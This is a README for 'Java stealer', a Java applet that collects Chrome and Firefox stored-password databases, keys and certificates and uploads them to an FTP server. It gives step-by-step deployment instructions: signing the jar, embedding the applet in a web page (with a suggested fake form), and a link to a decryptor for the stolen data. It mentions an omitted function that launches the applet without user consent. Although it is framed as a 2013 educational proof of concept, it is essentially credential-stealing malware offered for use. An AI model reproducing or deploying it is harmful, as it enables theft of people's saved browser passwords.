# Java stealer
 
Java stealer is a simple Java applet that fetch for the chrome and Firefox stored passwords database. It upload ths sqlite files with the keys and Certificates to an ftp server and decrypt(function omitted from the github) the data.  
<br>

## Instructions   <br>
To use this applet follow these instruction :<br>
<br>
1- compile the code and generate .class<br>
2- generate the keys : `keytool -genkey -alias your_Alias` <br>
3- Sign your jar file : `jarsigner -verbose your_applet.jar your_allias`<br>
4- include the applet in an HTML page.<br>
`<html>`
`<APPLET CODE=”applet/Jform.class”
WIDTH=”100%” HEIGHT=600px>`
`<!-- you could insert a fake form -->`
`</html>`
<br>
once the user display the applet send the databases to the FTP server with the needed files : if you want to decrypt them you could use a sqlite decryptor software. e.g <a href="https://gist.githubusercontent.com/jordan-wright/5770442/raw/a63dfcd8889e45d1765d8d53f35443e307ab2f99/chrome_extract.py">decryptor written in python</a><br>

NB : This code is outdated (2013) and Java applets are no longer supported in the latest chrome browser, switch to another browser or to an old version (https://www.java.com/fr/download/faq/chrome.xml).<br>
**Important** : 
The original code (omitted from the github)  has a function that bypass the applet prompt and launch automatically the applet without the users agreement (Java 7). This code was written as a prof of concept and for *an educational purpose*.
